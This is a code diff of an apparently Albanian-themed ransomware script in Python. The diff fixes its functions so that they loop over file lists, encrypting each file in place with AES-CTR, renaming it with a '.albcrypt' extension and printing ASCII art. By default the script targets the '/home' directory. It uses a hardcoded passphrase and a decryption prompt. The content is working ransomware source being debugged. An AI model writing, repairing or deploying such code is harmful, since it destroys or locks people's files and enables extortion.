@@ -16,27 +16,28 @@ hardcoded_passphrase = "albanian submarine"
 def encrypt_files(file_name, key):
 
     aes = pyaes.AESModeOfOperationCTR(key)
-    with open(file_name, 'rb') as (fo):
-        plaintext = fo.read()
-    enc = aes.encrypt(plaintext)
-    with open(file_name, 'wb') as (fo):
-        fo.write(enc)
-    os.rename(file_name, file_name + '.albcrypt')
-    print(ascii_artwork.ascii_artwork_enc)
+    for file in file_name:
+        with open(file, 'rb') as (fo):
+            plaintext = fo.read()
+        enc = aes.encrypt(plaintext)
+        with open(file, 'wb') as (fo):
+            fo.write(enc)
+        os.rename(file, file + '.albcrypt')
+        print(ascii_artwork.ascii_artwork_enc)
 
 
 #function to decrypt files
 def decrypt_files(file_name, key):
 
     aes = pyaes.AESModeOfOperationCTR(key)
-    with open(file_name, 'rb') as (fo):
-        plaintext = fo.read()
-    dec = aes.decrypt(plaintext)
-    with open(file_name, 'wb') as (fo):
-        fo.write(dec)
-    os.path.splitext(file_name)[0]
-    print(file_name)
-    print(ascii_artwork.ascii_artwork_dec)
+    for file in file_name:
+        with open(file, 'rb') as (fo):
+            plaintext = fo.read()
+        dec = aes.decrypt(plaintext)
+        with open(file, 'wb') as (fo):
+            fo.write(dec)
+        os.rename(file, file[:-9])
+        print(ascii_artwork.ascii_artwork_dec)
 
 
 #function to parse decrypt option
@@ -84,7 +85,7 @@ Celesi i dekriptimit eshte: {hardcoded_passphrase}
         passphrase = input('VENDOS CELESIN KETU: ')
 
         if passphrase == hardcoded_passphrase:
-            decrypt_files(recon_dec.get_files(startpath), key)
+            decrypt_files(recon_dec.get_encrypted_files(startpath), key)
         else:
             print("Your decryption key is incorrect!")
         exit()
@@ -94,7 +95,6 @@ Celesi i dekriptimit eshte: {hardcoded_passphrase}
             passphrase = hardcoded_passphrase
     
     if startpath:
-
         encrypt_files(recon.get_files(startpath), key)
     else:
         encrypt_files(recon.get_files('/home'), key)
